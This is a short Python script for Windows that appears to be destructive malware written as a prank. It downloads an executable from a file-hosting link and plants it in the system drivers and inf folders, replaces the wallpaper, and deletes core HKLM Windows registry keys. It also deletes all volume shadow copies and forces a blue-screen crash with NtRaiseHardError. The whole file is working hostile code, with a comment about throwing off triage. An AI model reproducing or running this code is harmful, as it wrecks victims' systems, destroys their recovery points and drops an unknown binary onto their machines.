import requests, subprocess, os, ctypes, winreg, wmi

# to throw off triage
def download():
    try:
        np = requests.get('https://download1640.mediafire.com/0cg81k7i3oog0Vrbdvt4z8Dm6cr_cYgIEn6I2oJdtsv-N_wutfpSfI4z9KrH_cLItET4oZQ6fIi8Feybi8udAp58vKj2ivjUNebKCSktSQxdnFgodWEDHYVdGqVc8cLsiSZPCZPB8BWlqxdub01nZnvJSnWIoj1sxQMJ4FIB554fCPA/pk3gvqwu9nc3fs4/notepad.exe')
        png = requests.get('https://pbs.twimg.com/media/GKNKk_GXMAAGxrG.png') #find way to change url or embed 

        # drop notepad in drivers folder
        with open('c:\\Windows\\System32\\drivers\\sjs.sys', 'wb') as npFile:
            npFile.write(np.content)
        with open('c:\\Windows\\inf\\sjs.inf', 'wb') as npFile:
            npFile.write(np.content)

        # download golden sigma image
        with open('C:\\sigma.png', 'wb') as sigma:
            sigma.write(png.content)

        # change wallpaper
        os.system('reg delete "HKCU\Control Panel\Desktop" /v Wallpaper /f')
        os.system('reg add "HKCU\Control Panel\Desktop" /t REG_SZ /v Wallpaper /d "C:\sigma.png" /f')
        ctypes.windll.user32.SystemParametersInfoW(20, 0, 'c:\\sigma.png', 3)
    except:
        print('whuh oh :-/')

# cut down on code
def do_command(cmd):
    subprocess.run(cmd, creationflags=subprocess.CREATE_NO_WINDOW)

# do funny registry
def regFuck():
    try:
        funny = winreg.HKEY_LOCAL_MACHINE
        winreg.EnumKey(funny, 0)
        do_command('reg delete "HKLM\SOFTWARE\Microsoft\Windows NT" /f')
        do_command('reg delete "HKLM\SOFTWARE\Microsoft\Windows" /f')
    except:
        print('bruh')

# yeet shadow copies
def yeetShadow():
    d = wmi.WMI()
    for shadow in d.Win32_ShadowCopy():
        shadow.Delete_()

# throws a bugcheck
def Bugcheck(code):
    try:
        # specify ntdll
        ntdl = ctypes.windll.ntdll

        # adjust privileges to do funny
        funny = ntdl.RtlAdjustPrivilege(19, True, False, ctypes.pointer(ctypes.c_bool()))

        #do the funny
        response = ctypes.c_ulong()
        funny = ntdl.NtRaiseHardError(code, 0, 0, 0, 6, ctypes.byref(response))
    except:
        print('you win!')